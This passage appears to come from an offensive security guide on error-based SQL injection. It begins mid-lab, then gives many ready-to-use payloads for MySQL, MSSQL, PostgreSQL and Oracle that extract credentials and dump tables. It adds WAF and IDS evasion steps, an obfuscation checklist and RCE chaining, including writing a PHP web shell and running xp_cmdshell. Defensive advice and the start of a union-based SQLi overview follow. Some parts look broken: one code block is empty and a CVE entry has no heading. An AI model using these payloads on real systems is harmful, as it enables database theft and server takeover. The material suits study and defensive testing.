TrackingId=abc' AND CAST((SELECT 1) AS int)--
\`\`\`

Error about boolean context -- the AND clause requires a boolean expression.

**Step 4: Fix the boolean context.**

\`\`\`
TrackingId=abc' AND 1=CAST((SELECT 1) AS int)--
\`\`\`

No error. The CAST succeeds because \`1\` is already an integer.

**Step 5: Target the username column.**

\`\`\`

\`\`\`

Error: subquery returns more than one row.

**Step 6: Clear the cookie value and add LIMIT 1.**

\`\`\`
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
\`\`\`

Error message reveals: \`invalid input syntax for type integer: "administrator"\`.

The username \`administrator\` is leaked directly in the error.

**Step 7: Extract the password.**

\`\`\`
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
\`\`\`

Error message reveals: \`invalid input syntax for type integer: "wr80f3v2i..."\`.

The password appears in the error. Log in as \`administrator\` with this password to solve the lab.

### Common Mistakes

1. **Forgetting LIMIT 1** -- Subqueries that return multiple rows cause "subquery returns more than 1 row" errors instead of data extraction
2. **Not clearing the original parameter value** -- Long cookie/parameter values plus the payload may exceed a character limit in the error output
3. **Ignoring the 32-character limit** -- MySQL EXTRACTVALUE/UPDATEXML only show ~32 characters per error; use SUBSTRING for longer values
4. **Wrong comment syntax for the database** -- \`--\` requires a trailing space in MySQL (\`-- \`), Oracle uses \`--\`, MSSQL accepts \`--\` or \`/* */\`

## Techniques

### Level 0: Understanding Why Errors Contain Data

The fundamental mechanism is that database error handlers are designed to be helpful to developers. When a function receives invalid input, the error message includes the invalid value to aid debugging. Error-based SQLi exploits this design by ensuring the "invalid value" is actually the result of an attacker-controlled subquery.

Three categories of error triggers:

1. **Type conversion errors** -- CAST/CONVERT a string value to an integer type. The error says "cannot convert 'THE_DATA' to integer." Works on MSSQL, PostgreSQL, MySQL (via XPath functions).
2. **Function input validation errors** -- Functions expecting specific formats (UUID, XPath, GTID, GeoHash, JSON) reject non-conforming input and include the rejected value in the error message.
3. **Arithmetic overflow errors** -- Expressions that exceed numeric type limits (BIGINT overflow, DOUBLE overflow, division by zero) produce errors containing the expression that caused the overflow.

### Level 1: Basic EXTRACTVALUE/UPDATEXML (MySQL)

**EXTRACTVALUE** and **UPDATEXML** are the two most common MySQL error-based functions. Both exploit XPath parsing errors. Available since MySQL 5.1, they are the first functions tested by sqlmap.

\`\`\`sql
-- EXTRACTVALUE: Invalid XPath triggers error containing the evaluated expression
-- DB: MySQL >= 5.1 | Char limit: 32 | Error: XPATH syntax error
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))
-- Output: XPATH syntax error: '~5.7.33~'

-- UPDATEXML: Same mechanism via XML update function
-- DB: MySQL >= 5.0 | Char limit: 32 | Error: XPATH syntax error
AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)
-- Output: XPATH syntax error: '~5.7.33~'
\`\`\`

The 32-character limit on XPath error output means longer values require chunked extraction (covered in Level 3).

### Level 2: CAST/CONVERT (MSSQL, PostgreSQL) and Conditional Errors

**MSSQL CAST/CONVERT** forces type conversion of a string to integer. The error includes the unconverted string.

\`\`\`sql
-- DB: MSSQL (all versions) | Char limit: ~8000 | Error: Conversion failed
AND 1=CONVERT(int,@@version)
-- Output: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.

AND 1=CAST((SELECT TOP 1 username+':'+password FROM users) AS int)
-- Output: Conversion failed when converting the nvarchar value 'admin:s3cr3t' to data type int.
\`\`\`

**PostgreSQL CAST** operates identically:

\`\`\`sql
-- DB: PostgreSQL (all versions) | Char limit: ~256 | Error: invalid input syntax
AND 1=CAST((SELECT version()) AS int)
-- Output: ERROR: invalid input syntax for type integer: "PostgreSQL 16.2 on x86_64..."

-- Shorthand :: operator (PostgreSQL-specific)
AND (SELECT version())::int=1
\`\`\`

**Conditional errors** use CASE WHEN to create a boolean oracle:

\`\`\`sql
-- Oracle: TO_CHAR(1/0) triggers ORA-01476 when condition is true
'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- MSSQL: Direct 1/0
SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE NULL END FROM users WHERE username='administrator'

-- PostgreSQL: 1/(SELECT 0) for division by zero
1=(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL: Multi-row subquery in scalar context
AND (SELECT IF(SUBSTRING(user(),1,1)='r',(SELECT table_name FROM information_schema.tables),'a'))
\`\`\`

### Level 3: FLOOR+RAND+GROUP BY, Oracle XMLType, Character Limit Bypass

**FLOOR(RAND(0)*2) with GROUP BY** is the classic MySQL double-query technique, available since MySQL 4.1 with a ~64 character output limit:

\`\`\`sql
-- DB: MySQL >= 4.1 | Char limit: ~64 | Error: Duplicate entry
AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- Output: Duplicate entry '~5.7.33~1' for key 'group_key'
\`\`\`

This works because \`FLOOR(RAND(0)*2)\` produces a deterministic sequence (0,1,1,0,1,1...) and is evaluated twice per row -- once for GROUP BY check, once for insertion -- causing a duplicate key. The source table must have at least 3 rows (\`information_schema.tables\` is reliable).

**Oracle XMLType** forces XML parsing errors:

\`\`\`sql
-- DB: Oracle 9i+ | Char limit: ~70 (standard) / 162 (base64) | Error: LPX-00234
AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE((SELECT banner FROM v$version WHERE ROWNUM=1),' ','_'))||'~'||CHR(62))) FROM DUAL)
-- Output: LPX-00234: namespace prefix "~Oracle_Database_11g~" is not declared
\`\`\`

**Oracle CTXSYS.DRITHSX.SN** (requires Oracle Text):

\`\`\`sql
-- DB: Oracle 10g+ | Char limit: ~4000 | Error: DRG-11701
AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))
-- Output: DRG-11701: thesaurus Oracle Database 11g Express Edition does not exist
\`\`\`

**Character limit bypass via SUBSTRING chunking:**

\`\`\`sql
-- MySQL EXTRACTVALUE: extract in 31-char chunks (1 char consumed by 0x7e prefix)
-- Chunk 1 (chars 1-31):
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM users LIMIT 0,1)))
-- Chunk 2 (chars 32-62):
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,31) FROM users LIMIT 0,1)))
-- Chunk 3 (chars 63-93):
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,63,31) FROM users LIMIT 0,1)))
\`\`\`

### Level 4: BIGINT Overflow, EXP Overflow, GTID_SUBSET, JSON_KEYS, UUID_TO_BIN, DIOS

These are higher-output alternatives to the 32-character XPath functions.

**BIGINT overflow (~0 technique):**

\`\`\`sql
-- DB: MySQL >= 5.5.5 | Char limit: ~255 | Error: BIGINT value is out of range
AND !(SELECT*FROM(SELECT CONCAT(0x7e,version(),0x7e))x)-~0
-- Output: BIGINT value is out of range in '((not((select '~5.7.33~' from dual))) - ~(0))'
\`\`\`

Mathematical basis: \`~0\` = 18446744073709551615 (max unsigned BIGINT). The subquery evaluates to a string, \`!\` (logical NOT) converts it to 0, and \`0 - 18446744073709551615\` underflows the signed BIGINT range.

**EXP() overflow:**

\`\`\`sql
-- DB: MySQL >= 5.5.5 | Char limit: ~255 | Error: DOUBLE value is out of range
AND EXP(~(SELECT*FROM(SELECT version())x))
-- Output: DOUBLE value is out of range in 'exp(~((select '5.7.33' from dual)))'
\`\`\`

**GTID_SUBSET (GTID parsing error):**

\`\`\`sql
-- DB: MySQL >= 5.6 | Char limit: ~200+ | Error: Malformed GTID set specification
AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1337)
-- Output: Malformed GTID set specification '~5.7.33~'
\`\`\`

**JSON_KEYS (JSON parsing error):**

\`\`\`sql
-- DB: MySQL >= 5.7.8 | Char limit: ~200+ | Error: Invalid JSON text
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))
-- Output: Invalid JSON text in argument 1 to function json_keys: "~5.7.33~"
\`\`\`

**UUID_TO_BIN / BIN_TO_UUID (MySQL 8.0+):**

\`\`\`sql
-- DB: MySQL >= 8.0 | Char limit: ~100+ | Error: Incorrect string value
AND UUID_TO_BIN((SELECT @@version))
-- Output: Incorrect string value: '8.0.32' for function uuid_to_bin

OR BIN_TO_UUID((SELECT password FROM users LIMIT 0,1))='1'
-- Output: Incorrect string value: 's3cr3t' for function bin_to_uuid
\`\`\`

**DIOS (Dump In One Shot) via BIGINT overflow:**

\`\`\`sql
-- DB: MySQL >= 5.5.5 | Dumps up to ~27 rows of schema::table::column
AND !(SELECT*FROM(SELECT(CONCAT(@:=0,(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND @:=CONCAT(@,0x0a,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
\`\`\`

### Level 5: Protocol-Level Techniques, WAFFLED Research, Geospatial Functions, Novel Techniques

**Geospatial function errors (MySQL 5.7+, rarely WAF-blocked):**

\`\`\`sql
-- DB: MySQL >= 5.7.5 | Char limit: ~100+ | Error: Incorrect geohash value
AND ST_LatFromGeoHash((SELECT @@version))
-- Output: Incorrect geohash value: '5.7.33' for function ST_LATFROMGEOHASH

AND ST_LongFromGeoHash((SELECT @@version))
-- Output: Incorrect geohash value: '5.7.33' for function ST_LONGFROMGEOHASH

AND ST_PointFromGeoHash((SELECT @@version),4326)
AND ST_GeomFromGeoJSON((SELECT CONCAT(username,':',password) FROM users LIMIT 0,1))
\`\`\`

**Geometry functions (MySQL 5.1-5.5 only):**

\`\`\`sql
-- DB: MySQL 5.1-5.5 | Error: Illegal non geometric
AND GEOMETRYCOLLECTION((SELECT*FROM(SELECT*FROM(SELECT @@version)a)b))
AND MULTIPOINT((SELECT*FROM(SELECT*FROM(SELECT user())a)b))
AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT database())a)b))
\`\`\`

**JSON_TABLE error leaking (MySQL 8.0.4+):**

\`\`\`sql
AND EXISTS (SELECT * FROM JSON_TABLE(
    (SELECT CONCAT('{"a":"',version(),'"}')),'$' COLUMNS (a INT PATH '$.a')) AS jt)
\`\`\`

**WAFFLED parsing discrepancy attacks (ACSAC 2025):** Exploit differences in how WAFs and backends parse HTTP requests. Send \`Content-Type: multipart/form-data\` with a URL-encoded body, use \`charset=ibm037\` encoding, or split payloads across chunked transfer-encoding boundaries. The WAF cannot reconstruct the payload, but the backend can.

**PostgreSQL query_to_xml bulk extraction:**

\`\`\`sql
-- DB: PostgreSQL >= 8.3 | Char limit: entire result set | Dumps ALL rows
AND 1=CAST(query_to_xml('SELECT * FROM users',true,true,'')::text AS int)
\`\`\`

**Oracle Base64-optimized XMLType (162 bytes per request):**

\`\`\`sql
SELECT ''||XMLType('<'||REGEXP_REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT banner FROM v$version WHERE ROWNUM=1))))||':x>',CHR(10)||'|'||CHR(13)||'|=',''))||'' FROM DUAL
\`\`\`

**MSSQL FOR XML PATH / FOR JSON bulk extraction:**

\`\`\`sql
-- DB: MSSQL 2005+ | Char limit: entire result set
AND 1=CAST((SELECT username+':'+password+'|' FROM users FOR XML PATH('')) AS int)

-- DB: MSSQL 2016+ | JSON variant (WAF bypass)
AND 1=CONVERT(int,(SELECT username,password FROM users FOR JSON PATH))
\`\`\`

## Exploitation

### Step-by-Step Error-Based Extraction (10 Steps)

**Step 1: Identify injection point.** Submit \`'\`, \`"\`, \`1/0\`, \`AND 1=1\` to each parameter. Look for error messages or behavioral changes.

**Step 2: Fingerprint the database.** Read the error message text. MySQL says "You have an error in your SQL syntax," MSSQL says "Conversion failed," PostgreSQL says "ERROR: invalid input syntax," Oracle says "ORA-" codes.

**Step 3: Confirm error-based data extraction is possible.** Inject a version extraction payload appropriate for the database. If the version appears in the error, direct error extraction works.

**Step 4: Extract the database name.**

\`\`\`sql
-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
-- MSSQL: AND 1=CONVERT(int,db_name())
-- PostgreSQL: AND 1=CAST((SELECT current_database()) AS int)
-- Oracle: AND 1=CTXSYS.DRITHSX.SN(user,(SELECT global_name FROM global_name))
\`\`\`

**Step 5: Enumerate tables.**

\`\`\`sql
-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))
-- Increment LIMIT offset: LIMIT 1,1 ... LIMIT 2,1 ... etc.
-- MSSQL: AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))
-- PostgreSQL: AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0) AS int)
-- Oracle: AND 1=CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1))
\`\`\`

**Step 6: Enumerate columns of target table.**

\`\`\`sql
-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))
-- MSSQL: AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))
-- PostgreSQL: AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)
\`\`\`

**Step 7: Extract data from target columns.**

\`\`\`sql
-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))
-- MSSQL: AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))
-- PostgreSQL: AND 1=CAST((SELECT username||':'||password FROM users LIMIT 1) AS int)
\`\`\`

**Step 8: Handle character limits.** For MySQL EXTRACTVALUE (32-char limit), chunk with SUBSTRING:

\`\`\`sql
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM users LIMIT 0,1)))
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,31) FROM users LIMIT 0,1)))
\`\`\`

**Step 9: Iterate through all rows.** Increment LIMIT offset (MySQL), OFFSET (PostgreSQL), or use \`NOT IN (SELECT TOP N ...)\` (MSSQL) to extract all records.

**Step 10: Validate extracted data.** Attempt login with extracted credentials. Verify completeness by checking row counts before extraction.

## Post-Exploitation

### Character Limit Bypass Techniques

| Function | Default Limit | Bypass Method |
|----------|--------------|---------------|
| EXTRACTVALUE/UPDATEXML | 32 chars | SUBSTRING(data, offset, 31) chunking |
| FLOOR+GROUP BY | ~64 chars | SUBSTRING chunking |
| EXP/BIGINT overflow | ~255 chars | Sufficient for most values; SUBSTRING for longer |
| GTID_SUBSET | ~200+ chars | Sufficient for most values |
| MSSQL CONVERT/CAST | ~8000 chars | Rarely needs chunking |
| PostgreSQL CAST | ~256 chars | SUBSTR(data, offset, length) |
| Oracle XMLType | ~70 chars (standard) | Base64 optimization (162B) or SUBSTR |

### DIOS (Dump In One Shot)

DIOS extracts multiple schema rows in a single request, bypassing the need for iterative LIMIT/OFFSET enumeration.

**MySQL DIOS via BIGINT overflow:**

\`\`\`sql
AND !(SELECT*FROM(SELECT(CONCAT(@:=0,(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND @:=CONCAT(@,0x0a,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
-- Returns up to ~27 rows of schema::table::column
\`\`\`

**MSSQL DIOS via FOR XML PATH:**

\`\`\`sql
AND 1=CAST((SELECT table_name+'::'+column_name+'|' FROM information_schema.columns FOR XML PATH('')) AS int)
-- Returns ALL columns in the database in a single error message
\`\`\`

**PostgreSQL DIOS via query_to_xml:**

\`\`\`sql
AND 1=CAST(query_to_xml('SELECT * FROM users',true,true,'')::text AS int)
-- Returns entire users table as XML in the error message
\`\`\`

### Chaining to RCE

Error-based SQLi can chain to remote code execution if the database supports stacked queries:

- **MSSQL:** \`; EXEC xp_cmdshell 'whoami'--\` (requires sysadmin role)
- **MySQL:** \`; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--\` (requires FILE privilege and known web root)
- **PostgreSQL:** \`; COPY (SELECT '') TO PROGRAM 'id'--\` (requires superuser)

## Detection Evasion

### WAF Bypass Strategy for Error-Based Functions

**Priority order when primary error functions are blocked:**

1. Try alternative error functions for the same database (see substitution table in Section 10)
2. Use hex encoding, CHAR() functions, or version-conditional comments to obfuscate function names
3. Use implicit type conversion (no CAST/CONVERT keyword)
4. Use CASE WHEN + arithmetic overflow (no error function keywords at all)
5. Use HTTP-level bypasses (double encoding, HPP, charset confusion, chunked encoding)
6. Use XML entity encoding if the injection point is in a SOAP/XML body

### IDS/WAF Detection Signatures to Avoid

\`\`\`
EXTRACTVALUE\\s*\\(        -- EXTRACTVALUE function call
UPDATEXML\\s*\\(           -- UPDATEXML function call
CONVERT\\s*\\(\\s*int       -- CONVERT to int
CAST\\s*\\(.*AS\\s+int      -- CAST to int
GTID_SUBSET\\s*\\(         -- GTID function
EXP\\s*\\(\\s*~             -- EXP overflow pattern
FLOOR\\s*\\(\\s*RAND        -- FLOOR+RAND pattern
XPATH syntax error        -- MySQL error output pattern
Conversion failed          -- MSSQL error output pattern
invalid input syntax       -- PostgreSQL error output pattern
\`\`\`

### Payload Obfuscation Checklist

- [ ] Randomize function name casing (MySQL, MSSQL, Oracle are case-insensitive)
- [ ] Replace spaces with inline comments \`/**/\`, tabs \`%09\`, newlines \`%0a\`
- [ ] Use hex encoding for string arguments (\`0x61646d696e\` instead of \`'admin'\`)
- [ ] Wrap error functions inside IF(), COALESCE(), or IIF()
- [ ] Use MySQL version-conditional comments \`/*!50000...*/\`
- [ ] Avoid CAST/CONVERT keywords (use implicit conversion or :: operator)
- [ ] Split payload across HTTP parameters (HPP)
- [ ] Double URL-encode if backend decodes twice

## Variations and Edge Cases

### Direct Error vs. Conditional Error: Dedicated Comparison

| Property | Direct Error Extraction | Conditional Error Oracle |
|----------|------------------------|--------------------------|
| **Data in error message** | YES -- verbatim | NO -- inferred from error/no-error |
| **Characters per request** | 32-8000 (function-dependent) | 1 bit (error vs. no-error) |
| **Speed** | Fast (few requests total) | Slow (7 requests per character with binary search) |
| **Prerequisite** | Verbose error messages visible | Any detectable error state (even generic 500) |
| **WAF evasion difficulty** | Harder (data appears in response body) | Easier (no data in response) |
| **Works with generic error pages** | NO -- need actual error text | YES -- only need 500 vs. 200 |
| **Stealth** | Low (extracted data in logs/responses) | High (only HTTP status differs) |
| **Automation complexity** | Simple regex parsing of error output | Binary search + charset iteration |
| **MySQL functions** | EXTRACTVALUE, UPDATEXML, EXP, BIGINT, GTID_SUBSET | CASE WHEN + IF + overflow |
| **MSSQL functions** | CONVERT, CAST, FOR XML PATH | CASE WHEN + 1/0 |
| **Oracle functions** | XMLType, CTXSYS, UTL_INADDR | CASE WHEN + TO_CHAR(1/0) |
| **PostgreSQL functions** | CAST(x AS int), ::int, query_to_xml | CASE WHEN + 1/(SELECT 0) |
| **SQLite functions** | None (no direct error extraction) | load_extension, abs overflow, json('') |

**When to use which:**

- **Direct error**: Verbose errors visible, speed is important, EXTRACTVALUE/CAST/CONVERT not filtered
- **Conditional error**: Error messages suppressed (generic error page), all direct functions blocked by WAF, maximum stealth needed, SQLite target
- **Hybrid approach**: Use conditional error to confirm injection, then attempt direct error for speed; fall back to conditional if blocked

### Error Functions Deprecated in Newer Versions

| Function | Deprecated/Removed | Notes |
|----------|-------------------|-------|
| PROCEDURE ANALYSE | Deprecated MySQL 5.7.18, removed 8.0 | Useful only for LIMIT clause injection |
| NAME_CONST | Constants only since ~5.6 | Effectively useless in modern MySQL |
| Geometry functions (POLYGON, etc.) | Changed behavior in MySQL 5.6+ | No longer produce useful errors |
| UTL_INADDR | ACL-restricted in Oracle 11g+ | Requires explicit ACL grant |

### Custom Error Handlers That Suppress Errors

Many frameworks implement custom error handling that strips database error details:

- **Django** -- \`DEBUG = False\` returns generic error page; no database errors visible. But \`DEBUG = True\` returns the Yellow Debug Page with full SQL query and error.
- **Rails** -- Production mode shows generic 500 page. Development mode shows full backtrace including SQL.
- **Spring Boot** -- \`server.error.include-message=never\` (default since 2.3+). Older versions may include error detail.
- **Laravel** -- \`.env APP_DEBUG=false\` suppresses details. \`APP_DEBUG=true\` shows Ignition page with SQL.
- **Express.js** -- Default error handler shows stack trace only in \`development\` mode.

**Bypass approaches:**
1. Check if the application has a \`?debug=true\` or \`X-Debug\` header that enables verbose errors
2. Look for error details in HTML comments, JavaScript variables, or API JSON responses
3. Check alternative error output locations (server logs via LFI, error monitoring endpoints)
4. Fall back to conditional error oracle (only needs behavioral difference, not error text)

### JSON/API Context Error Formatting

Modern APIs often return errors in structured JSON format:

\`\`\`json
{"status": "error", "code": 500, "message": "ERROR: invalid input syntax for type integer: \\"administrator\\""}
\`\`\`

Error-based extraction works identically -- the attacker reads the \`message\` field instead of parsing HTML. Some APIs truncate error messages or apply length limits that affect the number of characters extractable per request.

### Framework Error Pages vs. Raw DB Errors

| Source | Typical Content | Extraction Viability |
|--------|----------------|---------------------|
| Raw DB error (PHP \`mysqli_error()\`) | Full error with data | Direct extraction works |
| Django debug page | Full SQL query + error + traceback | Direct extraction works (data in error) |
| ASP.NET Yellow Screen of Death | Full stack trace with SQL details | Direct extraction works |
| Laravel Ignition | Full SQL + bindings + solution | Direct extraction works |
| Custom 500 page ("An error occurred") | No database detail | Conditional error only |
| Generic JSON \`{"error": "Internal Server Error"}\` | No database detail | Conditional error only |

## Modern Stack Specifics

### Cloud Database Services

- **AWS RDS / Aurora** -- Error messages are standard for the database engine (MySQL, PostgreSQL, etc.). AWS WAF may block common error functions unless bypassed.
- **Azure SQL Database** -- MSSQL errors are standard. Azure Front Door WAF applies additional filtering.
- **Google Cloud SQL** -- Standard database errors. Cloud Armor may intercept known injection patterns.

### ORM and Query Builder Behavior

- **Hibernate/JPA** -- Parameterized by default, but \`createNativeQuery()\` with string concatenation is vulnerable. Error messages propagate to the caller if not caught.
- **SQLAlchemy** -- \`text()\` with string formatting is vulnerable. \`execute()\` with bound parameters is safe.
- **Django ORM** -- Safe by default (\`filter()\`, \`get()\` use parameterized queries). \`raw()\` and \`extra()\` with string formatting are vulnerable.
- **ActiveRecord (Rails)** -- \`where()\` with hash/array syntax is safe. \`where("column = '#{input}'")\` with string interpolation is vulnerable.

### Container/Serverless

- **Docker containers** -- Error verbosity depends on the application config mounted/built into the image. Development images often have verbose errors enabled.
- **AWS Lambda** -- Errors may appear in CloudWatch logs rather than HTTP responses. API Gateway may transform error responses.
- **Kubernetes** -- Ingress controllers may add WAF-like filtering. Pod logs contain raw errors.

#### CVE-2024-42005 -- Django JSONField SQL Injection (CVSS 9.8)

**Software:** Django 5.0 before 5.0.8, 4.2 before 4.2.15. **Technique:** SQL injection in \`QuerySet.values()\` and \`values_list()\` via crafted JSON object keys. On PostgreSQL, error-based extraction via \`CAST((SELECT password FROM auth_user LIMIT 1) AS int)\` returns "invalid input syntax for type integer: 'the_actual_password'". **Bounty:** $4,263 (HackerOne Internet Bug Bounty). [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-42005) | [HackerOne #2646493](https://hackerone.com/reports/2646493)

**Software:** FortiClient EMS 7.0.1-7.0.10, 7.2.0-7.2.2. **Technique:** SQL injection in MSSQL backend DAS component. Error-based responses revealed SQL structure. Version 7.0.x exploited via \`CONVERT()\` on hex-encoded payloads to bypass automatic uppercasing -- a classic MSSQL error-based technique. Stacked queries enabled \`xp_cmdshell\` RCE. CISA KEV listed; actively exploited from March 2024. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-48788)

## Defensive Countermeasures

### Primary Defense: Parameterized Queries

Parameterized queries (prepared statements) eliminate SQL injection entirely by separating code from data at the protocol level. The database receives the query structure and the data values through separate channels, making it impossible for user input to alter the query's syntax.

\`\`\`java
// VULNERABLE: String concatenation
String query = "SELECT * FROM users WHERE id = '" + input + "'";

// SECURE: Parameterized query
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setString(1, input);
\`\`\`

\`\`\`python
# VULNERABLE: f-string interpolation
cursor.execute(f"SELECT * FROM users WHERE id = '{user_input}'")

# SECURE: Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
\`\`\`

\`\`\`php
// VULNERABLE: Direct concatenation
$query = "SELECT * FROM users WHERE id = '$id'";

// SECURE: Prepared statement (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
\`\`\`

### Error Message Suppression (Defense Against CWE-209)

Even if SQL injection exists, error-based extraction fails without verbose errors. This is defense in depth -- it removes the error-based data channel but does not fix the underlying vulnerability.

**PHP:**
\`\`\`ini
display_errors = Off
log_errors = On
error_reporting = E_ALL & ~E_NOTICE
\`\`\`

**Django:**
\`\`\`python
# settings.py
DEBUG = False
\`\`\`

**ASP.NET (web.config):**
\`\`\`xml
<customErrors mode="On" defaultRedirect="~/Error.aspx" />
\`\`\`

**Java/Spring:**
\`\`\`java
// Custom error handler -- log internally, return generic message
@ExceptionHandler(SQLException.class)
public ResponseEntity<String> handleSqlException(SQLException e) {
    logger.error("Database error", e);
    return ResponseEntity.status(500).body("An internal error occurred");
}
\`\`\`

**Express.js:**
\`\`\`javascript
// Production error handler -- no stack traces
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Internal server error' });
});
\`\`\`

### Why Error Suppression Alone Is NOT Sufficient

From CAPEC-7: "Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection." When errors are suppressed, attackers fall back to:

- Boolean-based blind extraction (page content differences)
- Time-based blind extraction (response delay)
- Out-of-band extraction (DNS/HTTP exfiltration)

Error suppression removes ONE data channel. Parameterized queries are the only complete fix.

### Defense in Depth Checklist

1. **Parameterized queries** -- eliminates injection entirely (primary defense)
2. **Input validation** -- whitelist acceptable characters, reject known-bad patterns
3. **Error message suppression** -- custom error pages, no database details in responses
4. **Least privilege** -- database user should have minimal permissions (no FILE, no xp_cmdshell)
5. **WAF rules** -- detect common error functions (EXTRACTVALUE, UPDATEXML, CONVERT, CAST)
6. **Custom error pages** -- generic 500 page with no information leakage
7. **Log monitoring** -- alert on patterns: repeated 500 errors, SQL keywords in parameters, error function names in request logs

## Overview

Union-based SQL injection is a data exfiltration technique where the attacker appends a \`UNION SELECT\` clause to the application's original SQL query, fusing an attacker-controlled SELECT statement with the legitimate one so that the combined result set flows through the application's normal output channel. The SQL \`UNION\` operator merges the rows returned by two or more SELECT statements into a single result set. By injecting a second SELECT that targets arbitrary tables -- tables the application was never designed to expose -- the attacker forces the database to return those rows alongside the original query's data. The application then renders both sets of data through its normal display logic, completely unaware that the second set was never part of the intended query. The attacker reads secrets directly from the page output: credentials, tokens, PII, schema metadata, configuration values, or any other data accessible to the database user.

The technique rests on one core requirement: the application must render query results back to the user. Unlike blind SQLi (where the attacker infers data from behavioral differences one bit at a time) or error-based SQLi (where data leaks through error messages), union-based extraction provides the full result set in a single response. This makes it the fastest in-band extraction method: an entire table can be dumped in a handful of requests using aggregation functions like \`GROUP_CONCAT()\`, \`STRING_AGG()\`, or \`LISTAGG()\`, compared to thousands of requests required by blind techniques. The speed advantage is measured in orders of magnitude -- a full user table that takes hours to extract via boolean-blind can be dumped in seconds via UNION.

Two hard constraints govern UNION injection. First, the attacker's injected SELECT must return exactly the same number of columns as the original query. A column count mismatch produces an immediate database error: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists." The attacker determines the column count through \`ORDER BY\` probing or iterative \`UNION SELECT NULL\` payloads before crafting the final extraction query. Second, the data types in each column position must be compatible between the original and injected queries. NULL values are universally type-compatible across all databases, so the attacker uses NULL placeholders initially, then replaces specific positions with string markers to identify which columns accept text and render on the page.

Once the column count and injectable text positions are known, the methodology proceeds through a deterministic sequence: fingerprint the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), enumerate the schema via system catalog tables (\`information_schema\`, \`all_tables\`, \`sqlite_master\`), identify target tables and columns containing sensitive data, and extract the data through the UNION channel. Advanced operators use aggregation functions to collapse all rows into a single output value (the Dump In One Shot technique) and can escalate from data extraction to file system read/write to remote code execution depending on the database engine and privilege level.

Union-based SQLi is classified under CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) and mapped to CAPEC-66 (SQL Injection). OWASP classifies it under A03:2021 (Injection) and A05:2025 (Security Misconfiguration when verbose errors assist exploitation). CVSS base scores for exploitable union-based SQLi consistently reach 9.8 Critical when the injection is unauthenticated, as demonstrated by CVE-2024-2879 (LayerSlider, 9.8), CVE-2024-27956 (WP-Automatic, 9.8), CVE-2022-0739 (BookingPress, 9.8), and CVE-2022-28346 (Django, 9.8). Academic research from the Georgia Institute of Technology found that UNION-based extraction accounts for approximately 20-25% of all SQL injection vulnerabilities in studied datasets and is the primary technique used for data exfiltration as opposed to authentication bypass.

## Understanding From Zero

### Analogy

